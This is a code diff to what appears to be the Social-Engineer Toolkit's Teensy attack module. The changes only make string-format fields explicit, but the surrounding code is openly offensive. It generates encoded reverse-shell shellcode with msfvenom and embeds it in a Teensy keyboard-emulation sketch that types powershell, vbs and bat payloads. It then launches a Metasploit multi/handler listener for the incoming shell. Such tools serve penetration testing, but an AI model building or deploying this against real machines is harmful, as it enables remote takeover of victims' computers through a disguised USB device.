@@ -246,7 +246,7 @@ except KeyboardInterrupt:
 
 print("   [*] Generating alpha_mixed shellcode to be injected after shellexec has been deployed on victim...")
 # grab msfvenom alphanumeric shellcode to be inserted into shellexec
-proc = subprocess.Popen("{} -p {} EXITFUNC=thread LHOST={} LPORT={} {} --format raw -e x86/alpha_mixed BufferRegister=EAX".format(os.path.join(core.meta_path(), "msfvenom"),
+proc = subprocess.Popen("{0} -p {1} EXITFUNC=thread LHOST={2} LPORT={3} {4} --format raw -e x86/alpha_mixed BufferRegister=EAX".format(os.path.join(core.meta_path(), "msfvenom"),
                                                                                                                                   payload,
                                                                                                                                   ipaddr,
                                                                                                                                   port,
@@ -311,7 +311,7 @@ with open(random_filename) as fileopen:
         if reading_hex == "":
             break
         # write out counter and hex
-        output_variable += 'prog_char RevShell_{}[] PROGMEM = "{}";\n'.format(counter, reading_hex)
+        output_variable += 'prog_char RevShell_{0}[] PROGMEM = "{1}";\n'.format(counter, reading_hex)
         # increase counter
         counter += 1
 
@@ -319,7 +319,7 @@ with open(random_filename) as fileopen:
 output_variable += "PROGMEM const char *exploit[] = {\n"
 # while rev_counter doesn't equal regular counter
 while rev_counter != counter:
-    output_variable += "RevShell_{}".format(rev_counter)
+    output_variable += "RevShell_{0}".format(rev_counter)
     # incremenet counter
     rev_counter += 1
     if rev_counter == counter:
@@ -439,8 +439,8 @@ Keyboard.set_key1(0);
 Keyboard.send_now();
 }}""".format(random_filename=random_filename, powershell_command=powershell_command, vbs=vbs, bat=bat, alpha_payload=alpha_payload))
 # delete temporary file
-subprocess.Popen("rm {} 1> /dev/null 2>/dev/null".format(random_filename), shell=True).wait()
-print("   [*] Binary to Teensy file exported as {}".format(os.path.join(core.setdir, "/reports/binary2teensy.pde")))
+subprocess.Popen("rm {0} 1> /dev/null 2>/dev/null".format(random_filename), shell=True).wait()
+print("   [*] Binary to Teensy file exported as {0}".format(os.path.join(core.setdir, "/reports/binary2teensy.pde")))
 # write the teensy.pde file out
 with open(os.path.join(core.setdir, "/reports/binary2teensy.pde"), 'w') as filewrite:
     # write the teensy.pde file out
@@ -450,13 +450,13 @@ print("   [*] Generating a listener...")
 # create our metasploit answer file
 with open(os.path.join(core.setdir, "answer.txt", "w")) as filewrite:
     filewrite.write("use multi/handler\n"
-                    "set payload {}\n"
-                    "set LHOST {}\n"
-                    "set LPORT {}\n"
-                    "{}\n"
+                    "set payload {0}\n"
+                    "set LHOST {1}\n"
+                    "set LPORT {2}\n"
+                    "{3}\n"
                     "exploit -j".format(payload, ipaddr, port, url))
 # spawn a multi/handler listener
-subprocess.Popen("msfconsole -r {}".format(os.path.join(core.setdir, "answer.txt")), shell=True).wait()
+subprocess.Popen("msfconsole -r {0}".format(os.path.join(core.setdir, "answer.txt")), shell=True).wait()
 print("   [*] Housekeeping old files...")
 # if our answer file is still there (which it should be), then remove it
 if os.path.isfile(os.path.join(core.setdir, "answer.txt")):
